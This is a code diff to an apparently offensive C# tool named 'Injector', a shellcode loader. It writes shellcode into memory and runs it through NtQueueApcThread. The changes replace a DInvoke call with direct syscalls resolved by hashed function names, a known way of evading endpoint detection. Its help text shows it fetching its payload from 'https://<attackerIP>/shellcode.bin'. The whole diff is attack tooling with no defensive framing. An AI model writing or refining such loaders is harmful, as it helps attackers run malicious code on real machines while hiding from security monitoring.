@@ -51,11 +51,9 @@ namespace Injector
             Marshal.Copy(sc, 0, buffer, sc.Length);
             uint bytesWritten = 0;
 
-            //hm.setScInfo(baseAddr, sc.Length);
-
             object[] write = { (IntPtr)(-1), baseAddr, buffer, (uint)sc.Length, bytesWritten };
             id = dict[DInvoke.DynamicInvoke.EAT.GetSha256Hash("NtWriteVirtualMemory")];
-            DInvoke.DynamicInvoke.Native.NtWriteVirtualMemory((IntPtr)(-1), baseAddr, buffer, (uint)sc.Length);
+            Syscalls.executeSyscall(id, "NtWriteVirtualMemory", write);
 
 
             uint oldProtect = 0;
@@ -69,7 +67,7 @@ namespace Injector
             id = dict[DInvoke.DynamicInvoke.EAT.GetSha256Hash("NtQueueApcThread")];
             Syscalls.executeSyscall(id, "NtQueueApcThread", apc);
 
-            hm.Install(); //I just wanted to hook GetProcAddress
+           // hm.Install(); I just wanted to hook GetProcAddress, but this is not usefull for the shellcode injection.
 
 
             object[] alert = {};
@@ -81,7 +79,7 @@ namespace Injector
 
         private static void printHelp()
         {
-            var help = "usage: Injector.exe https://<attackerIP>/shellcode.bin";
+            var help = "Usage: Injector.exe https://<attackerIP>/shellcode.bin";
             Console.WriteLine(help);
         }
     }
